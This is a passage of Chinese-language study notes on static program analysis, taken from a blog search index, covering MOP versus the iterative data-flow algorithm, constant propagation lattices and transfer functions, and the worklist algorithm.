）。</p><p><strong>路径P上的转移函数Fp</strong>：该路径上所有语句的转移函数的组合fs1，fs2，… ，fsi-1，从而构成FP。</p><p><strong>MOP</strong>：从entry到si所有路径的FP的meet操作。本质—求这些值的最小上界/最大下界。</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404241002877.webp" alt="img"></p><p>4-9-1-MOP公式.png</p><p><strong>MOP准确性</strong>：有些路径不会被执行，所以不准确；若路径包含循环，或者路径爆炸，所以实操性不高，只能作为理论的一种衡量方式。</p><h4 id="2mop-vs-迭代算法">（2）MOP vs 迭代算法</h4><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404241002942.webp" alt="img"></p><p>4-9-2-MOP与迭代算法比较.png</p><p>对于以上的CFG，抽象出itter和MOP公式。</p><p><strong>证明</strong>：</p><ol><li>根据最小上界的定义，有x⊑x⊔y和 y⊑x⊔y。</li><li>由于转换函数是单调的，则有F(x)⊑F(x⊔y)和F(y)⊑F(x⊔y)，所以F(x⊔y)就是F(x)和F(y)的上界。</li><li>根据定义，F(x)⊔F(y)是F(x)和F(y)的最小上界。</li><li>所以<em>F</em>(<em>x</em>)⊔<em>F</em>(<em>y</em>)⊑<em>F</em>(<em>x</em>⊔<em>y</em>)</li></ol><p><strong>结论</strong>：所以，MOP更准确。若F满足分配律，则迭代算法和MOP精确度一样 <em>F</em>(<em>x</em>⊔<em>y</em>)=<em>F</em>(<em>x</em>)⊔<em>F</em>(<em>y</em>)。一般，对于控制流的join/meet，是进行集合的交或并操作，则满足分配律。</p><hr><h2 id="10常量传播-constant-propagation">10.常量传播 (constant propagation)</h2><p><strong>问题描述</strong>：在程序点p处的变量x，判断x是否一定指向常量值。</p><p><strong>类别</strong>：<strong>must分析</strong>，因为要考虑经过p点所有路径上，x的值必须都一样，才算作一定指向常量。</p><p><strong>表示</strong>：CFG每个节点的OUT是pair（x, v）的集合，表示变量x是否指向常数v。</p><h4 id="数据流分析框架d-l-f">数据流分析框架（D, L, F）</h4><p>（1）D：forward更直观</p><p>（2）L：lattice</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404241002090.webp" alt="img"></p><p>4-10-1-UNDEF_NAC.png</p><p><strong>变量值域</strong>：所有实数。must分析，所以<img src="mdPics/math" alt="\top">是UNDEF未定义（unsafe），<img src="https://math.jianshu.com/math?formula=%5Cperp" alt="\perp"> 是NAC非常量（safe）。</p><p><strong>meet操作</strong>：must分析， <img src="https://math.jianshu.com/math?formula=%5Csqcap" alt="\sqcap">。在每个路径汇聚点PC，对流入的所有变量进行meet操作，但并非常见的交和并，所以<strong>不满足分配律</strong>。</p><ul><li>NAC <img src="https://math.jianshu.com/math?formula=%5Csqcap" alt="\sqcap"> v = NAC</li><li>UNDEF <img src="https://math.jianshu.com/math?formula=%5Csqcap" alt="\sqcap"> v = v  未初始化的变量不是我们分析的目标。</li><li>c <img src="https://math.jianshu.com/math?formula=%5Csqcap" alt="\sqcap"> v = ?                   c <img src="https://math.jianshu.com/math?formula=%5Csqcap" alt="\sqcap"> c = c          c1 <img src="https://math.jianshu.com/math?formula=%5Csqcap" alt="\sqcap"> c2 =NAC</li></ul><p>（3）<strong>F转换函数</strong></p><p>OUT[s] = gen U (IN[s] - {(x, _})</p><p>输出 = BB中新被赋值的 U 输入 - BB中相关变量值已经不是f常量的部分。</p><p>对所有的赋值语句进行分析（不是赋值语句则不管，用val(x)表示x指向的值）：</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404241002116.webp" alt="img"></p><p>4-10-2-赋值语句操作.png</p><p>（4）<strong>性质</strong>：不满足分配律</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404241002132.webp" alt="img"></p><p>4-10-3-不满足分配律.png</p><p>可以发现，MOP更准确。F(X<img src="https://math.jianshu.com/math?formula=%5Csqcap" alt="\sqcap">Y) <img src="https://math.jianshu.com/math?formula=%5Csqsubseteq" alt="\sqsubseteq"> F(X) <img src="https://math.jianshu.com/math?formula=%5Csqcap" alt="\sqcap"> F(Y)，但是是单调的。</p><hr><h2 id="11worklist算法">11.Worklist算法</h2><p><strong>本质</strong>：对迭代算法进行优化，采用队列来存储需要处理的基本块，减少大量的冗余的计算。</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404241002166.webp" alt="img"></p><p>4-11-worklist.png</p><p>作者：bsauce<br>链接：<a href="https://www.jianshu.com/p/d314b316b332">https://www.jianshu.com/p/d314b316b332</a><br>来源：简书<br>著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。</p>]]></content>
      
      
      <categories>
          
          <category> 软件分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 软件分析 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
